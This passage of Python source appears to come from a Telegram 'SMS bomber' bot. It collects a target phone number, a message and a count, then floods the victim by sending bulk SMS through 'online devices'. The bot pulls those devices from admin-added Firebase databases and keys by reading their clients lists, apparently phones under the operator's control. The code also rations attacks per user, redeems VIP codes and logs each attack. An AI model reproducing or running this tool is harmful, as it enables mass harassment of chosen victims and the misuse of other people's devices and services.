                user_states[user_id]["step"] = "message"
                keyboard = make_kb([[btn("❌ CANCEL", callback_data="cancel")]])
                send_message(chat_id, f"🎯 Target: {target_number}\nNow send the SMS Message text:\n\nSend /cancel to cancel.", reply_markup=keyboard)
            else:
                send_message(chat_id, "❌ Invalid phone number!\n\nPlease enter a valid Indian mobile number.\nExamples: +919876543210, 9876543210\n\nSend /cancel to cancel.")
            return

        if step == "message":
            if not text:
                send_message(chat_id, "❌ Please send a message.")
                return
            if len(text) >= 2:
                user_states[user_id]["message"] = text
                user_states[user_id]["step"] = "count"
                user_data = get_user_data(user_id)
                _, max_sms = get_user_limits(user_data)
                keyboard = make_kb([[btn("❌ CANCEL", callback_data="cancel")]])
                send_message(chat_id, f"💬 Message set!\nNow send SMS count (Max Limit: {max_sms} SMS | Your Max: {max_sms} SMS):\n\nSend /cancel to cancel.", reply_markup=keyboard)
            else:
                send_message(chat_id, "❌ Message too short!\n\nPlease enter a proper message (at least 2 characters).\n\nSend /cancel to cancel.")
            return

        if step == "count":
            if not text:
                send_message(chat_id, "❌ Please send a count number.")
                return
            if text.isdigit():
                count = int(text)
                if count < 1:
                    send_message(chat_id, "❌ Count must be at least 1!")
                    return
                user_data = get_user_data(user_id)
                _, max_sms = get_user_limits(user_data)
                if count > max_sms:
                    send_message(chat_id, f"❌ Maximum limit is {max_sms} SMS!")
                    return
                target = user_states[user_id].get("target")
                msg = user_states[user_id].get("message")
                if not target or not msg:
                    send_message(chat_id, "❌ Please start again with /start")
                    if user_id in user_states:
                        del user_states[user_id]
                    return
                del user_states[user_id]

                devices = get_cached_devices(force=False)
                if not devices:
                    send_message(chat_id, "⏳ Fetching online devices...")
                    devices = fetch_all_online_devices()
                if not devices:
                    send_message(chat_id, "❌ No online devices available!")
                    return

                status_msg = send_message(chat_id,
                    f"🚀 High-Speed Attack Started!\nTarget: {target}\nCount: {count}\n\nUse /stop or button below to cancel.",
                    reply_markup=make_kb([[btn("🛑 STOP BOMBING", callback_data="stop_attack")]])
                )
                msg_id = status_msg.get("result", {}).get("message_id") if status_msg and status_msg.get("ok") else None

                try:
                    username = user_data.get('username', 'Unknown')
                    result = send_bulk_sms(target, msg, count, devices)
                    user_data["daily_attacks"] = user_data.get("daily_attacks", 0) + 1
                    user_data["total_sms_sent"] = user_data.get("total_sms_sent", 0) + result["sent"]
                    user_data["last_attack_time"] = get_ist_now().isoformat()
                    update_user_data(user_id, user_data)
                    log_attack(user_id, username, target, count, result["sent"], result["failed"], result.get("elapsed_time", "0s"))
                    result_text = f"""✅ Attack Finished!
==========================
🚀 Sent: {result['sent']}
❌ Failed: {result['failed']}
⏳ Time: {result.get('elapsed_time', '0s')}
⚡ Method: Parallel
=========================="""
                    if result["errors"]:
                        result_text += f"\n⚠️ Errors: {', '.join(result['errors'][:3])}"
                    keyboard = make_kb([
                        [btn("🚀 START BOMBING", callback_data="start_bombing")],
                        [btn("📊 MY PROFILE", callback_data="my_profile"), btn("📈 STATS", callback_data="stats")],
                        [btn("👑 SUPPORT", url=f"https://t.me/{DEVELOPER_USERNAME.replace('@', '')}")]
                    ])
                    if msg_id:
                        edit_message(chat_id, msg_id, result_text, reply_markup=keyboard)
                    else:
                        send_message(chat_id, result_text, reply_markup=keyboard)
                except Exception as e:
                    error_text = f"❌ Attack Failed!\n\nError: {str(e)}\n\nPlease try again or contact admin."
                    keyboard = make_kb([[btn("🔙 BACK", callback_data="back_to_menu")]])
                    if msg_id:
                        edit_message(chat_id, msg_id, error_text, reply_markup=keyboard)
                    else:
                        send_message(chat_id, error_text, reply_markup=keyboard)
            else:
                send_message(chat_id, "❌ Invalid input!\n\nPlease enter a valid number.\n\nSend /cancel to cancel.")
            return

    if text and text.startswith("VIP-"):
        result = redeem_gift_code(user_id, text)
        if result["success"]:
            keyboard = make_kb([[btn("🔙 BACK TO MENU", callback_data="back_to_menu")]])
            send_message(chat_id, result["message"], reply_markup=keyboard)
        else:
            keyboard = make_kb([[btn("🔙 BACK TO MENU", callback_data="back_to_menu")]])
            send_message(chat_id, f"{result['message']}", reply_markup=keyboard)
        return

    if document:
        if not is_admin(user_id):
            send_message(chat_id, "❌ Only owner can add Firebase via file!")
            return
        file_id = document.get("file_id")
        file_name = document.get("file_name", "")
        if not file_name.endswith('.txt'):
            send_message(chat_id, "❌ Please send a .txt file only.")
            return
        file_info = get_file(file_id)
        if not file_info or not file_info.get("ok"):
            send_message(chat_id, "❌ Failed to get file.")
            return
        file_path = file_info.get("result", {}).get("file_path")
        if not file_path:
            send_message(chat_id, "❌ Failed to get file path.")
            return
        content = download_file(file_path)
        if not content:
            send_message(chat_id, "❌ Failed to download file.")
            return
        try:
            lines = content.decode('utf-8').strip().split('\n')
            configs = load_firebase_configs()
            existing = {c["url"] for c in configs}
            added = []
            failed = []
            dup = []
            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split()
                if len(parts) < 2:
                    failed.append({"line": line, "reason": "Invalid format"})
                    continue
                url = parts[0].strip()
                key = parts[1].strip()
                if not url.startswith("http"):
                    failed.append({"line": line, "reason": "Invalid URL"})
                    continue
                if url in existing:
                    dup.append({"url": url, "key": key})
                    continue
                ver = verify_firebase_connection(url, key)
                if ver["valid"]:
                    configs.append({"url": url, "key": key, "added_by": user_id, "added_at": get_ist_now().isoformat()})
                    existing.add(url)
                    added.append({"url": url, "key": key, "devices": ver.get("devices", 0)})
                else:
                    failed.append({"line": line, "reason": ver["message"]})
            save_firebase_configs(configs)
            threading.Thread(target=fetch_all_online_devices, daemon=True).start()
            report = []
            report.append("="*60)
            report.append("FIREBASE BULK ADD REPORT")
            report.append(f"Date: {get_ist_time_str()} IST")
            report.append("="*60)
            report.append(f"✅ SUCCESSFULLY ADDED ({len(added)})")
            for item in added:
                report.append(f"URL: {item['url']} | Devices: {item.get('devices',0)}")
            if dup:
                report.append(f"⚠️ DUPLICATES SKIPPED ({len(dup)})")
                for item in dup:
                    report.append(f"URL: {item['url']}")
            if failed:
                report.append(f"❌ FAILED ({len(failed)})")
                for item in failed:
                    report.append(f"Line: {item['line']} | Reason: {item['reason']}")
            report.append("="*60)
            report.append(f"Total: {len(added)+len(dup)+len(failed)} | Added: {len(added)} | Dup: {len(dup)} | Failed: {len(failed)}")
            report_text = "\n".join(report)
            if len(report_text) > 4000:
                file_obj = io.BytesIO(report_text.encode('utf-8'))
                file_obj.name = "firebase_report.txt"
                send_document(chat_id, file_obj, caption="📊 Firebase Bulk Add Report")
            else:
                send_message(chat_id, report_text)
        except Exception as e:
            send_message(chat_id, f"❌ Error: {str(e)}")
        return

    if photo:
        if not is_admin(user_id):
            send_message(chat_id, "❌ Only owner can set welcome image!")
            return
        file_id = photo[-1]["file_id"]
        welcome_info = load_welcome_image_info()
        welcome_info["file_id"] = file_id
        if not welcome_info.get("caption"):
            welcome_info["caption"] = "🔥 Welcome to VIPXOFFICIAL Bomber!"
        save_welcome_image_info(welcome_info)
        keyboard = make_kb([[btn("🔙 Back to Admin", callback_data="admin_back")]])
        send_message(chat_id, f"✅ Welcome image updated successfully!\n\nCurrent caption: {welcome_info['caption']}", reply_markup=keyboard)
        return

    if text and len(text.split()) >= 2 and text.split()[0].startswith("http"):
        if not is_admin(user_id):
            send_message(chat_id, "❌ Only owner can add Firebase!")
            return
        parts = text.split()
        url = parts[0].strip()
        key = parts[1].strip()
        if not url.startswith("http"):
            url = "https://" + url
        configs = load_firebase_configs()
        for config in configs:
            if config.get("url") == url:
                send_message(chat_id, "⚠️ This Firebase URL is already added.")
                return
        status_msg = send_message(chat_id, "🔍 Verifying Firebase connection...")
        verification = verify_firebase_connection(url, key)
        if verification["valid"]:
            configs.append({"url": url, "key": key, "added_by": user_id, "added_at": get_ist_now().isoformat()})
            save_firebase_configs(configs)
            threading.Thread(target=fetch_all_online_devices, daemon=True).start()
            keyboard = make_kb([[btn("🔙 Back to Firebase", callback_data="admin_firebase")]])
            msg_id = status_msg.get("result", {}).get("message_id") if status_msg and status_msg.get("ok") else None
            text_msg = f"✅ Firebase added successfully!\n\n📡 URL: {url}\n🔑 Key: {key[:15]}...\n📱 Active Devices: {verification.get('devices', 0)}"
            if msg_id:
                edit_message(chat_id, msg_id, text_msg, reply_markup=keyboard)
            else:
                send_message(chat_id, text_msg, reply_markup=keyboard)
        else:
            keyboard = make_kb([[btn("🔙 Back to Firebase", callback_data="admin_firebase")]])
            msg_id = status_msg.get("result", {}).get("message_id") if status_msg and status_msg.get("ok") else None
            text_msg = f"{verification['message']}\n\n📡 URL: {url}\n🚫 Status: ❌ Failed"
            if msg_id:
                edit_message(chat_id, msg_id, text_msg, reply_markup=keyboard)
            else:
                send_message(chat_id, text_msg, reply_markup=keyboard)
        return

    if text and is_admin_or_second(user_id):
        settings = load_admin_settings()
        if settings.get("broadcast_message") == text:
            users = load_user_data()
            sent = 0
            failed = 0
            for uid in users:
                try:
                    send_message(int(uid), f"📢 Broadcast from Admin\n\n{text}")
                    sent += 1
                    time.sleep(0.1)
                except:
                    failed += 1
            settings["broadcast_message"] = None
            settings["last_broadcast"] = get_ist_time_str()
            save_admin_settings(settings)
            keyboard = make_kb([[btn("🔙 Back to Admin", callback_data="admin_back")]])
            send_message(chat_id, f"✅ Broadcast complete!\n\n📤 Sent: {sent}\n❌ Failed: {failed}", reply_markup=keyboard)
            return

    keyboard = make_kb([[btn("🔙 Back to Menu", callback_data="back_to_menu")]])
    send_message(chat_id, "❌ Please use /start to begin.\n\nOr send a .txt file (admin) to bulk add Firebase.", reply_markup=keyboard)

# ==================== VERIFY FIREBASE CONNECTION ====================

def verify_firebase_connection(url, key):
    try:
        url = url.strip().rstrip('/')
        if not url.startswith("http"):
            url = "https://" + url
        test_url = f"{url}/clients.json?auth={key}"
        response = requests.get(test_url, timeout=10)
        status = response.status_code
        if status == 200:
            try:
                data = response.json()
                device_count = 0
                if data and isinstance(data, dict):
                    for device_id, device_data in data.items():
                        if isinstance(device_data, dict) and device_data.get("status", False):
                            device_count += 1
                return {
                    "valid": True,
                    "message": "✅ Firebase connection verified successfully!",
                    "status_code": 200,
                    "devices": device_count,
                    "total_clients": len(data) if data and isinstance(data, dict) else 0
                }
            except:
                return {"valid": True, "message": "✅ Firebase connection verified successfully!", "status_code": 200, "devices": 0, "total_clients": 0}
        elif status == 401:
            return {"valid": False, "message": "❌ Authentication failed! Invalid API Key / Secret.", "status_code": 401, "devices": 0}
        elif status == 403:
            return {"valid": False, "message": "❌ Permission denied! Your key doesn't have access.", "status_code": 403, "devices": 0}
        elif status == 404:
            return {"valid": False, "message": "❌ Firebase database not found! The URL may be incorrect.", "status_code": 404, "devices": 0}
        elif status == 423:
            return {"valid": False, "message": f"❌ Firebase database has been deactivated or locked. HTTP {status}", "status_code": 423, "devices": 0}
        else:
            return {"valid": False, "message": f"❌ Connection failed! HTTP {status}", "status_code": status, "devices": 0}
    except Exception as e:
        return {"valid": False, "message": f"❌ Error: {str(e)}", "status_code": 0, "devices": 0}

# ==================== MAIN LOOP ====================

def main():
    global last_update_id
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("✅ VIPXOFFICIAL BOT STARTED (RAILWAY READY)!")
    print("👑 Developer: @VIP_X_OFFICIAL")
    print("📡 Connected to", len(load_firebase_configs()), "Firebase(s)")
    cache = load_device_cache()
    devs = cache.get("devices", [])
    if not isinstance(devs, list):
        devs = []
    print("⚡ Online Devices:", len(devs))
    print("👥 Second Admins:", len(load_second_admins()))
    print("📢 Logger Group:", LOGGER_GROUP_ID)
    print("📸 Welcome Image:", "✅ Set" if load_welcome_image_info().get('file_id') else "❌ Not Set")
    print("🚀 Parallel SMS: ENABLED (Fast Mode)")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    if not devs:
        threading.Thread(target=fetch_all_online_devices, daemon=True).start()

    while True:
        try:
            updates = get_updates(last_update_id + 1 if last_update_id else None)
            if updates and updates.get("ok"):
                for update in updates.get("result", []):
                    last_update_id = update.get("update_id")
                    if "message" in update:
                        handle_message(update["message"])
                    elif "callback_query" in update:
                        cb = update["callback_query"]
                        handle_callback(
                            cb,
                            cb.get("message", {}).get("chat", {}).get("id"),
                            cb.get("from", {}).get("id"),
                            cb.get("message", {}).get("message_id")
                        )
            time.sleep(0.5)
        except Exception as e:
            logger.error(f"Main loop error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    main()
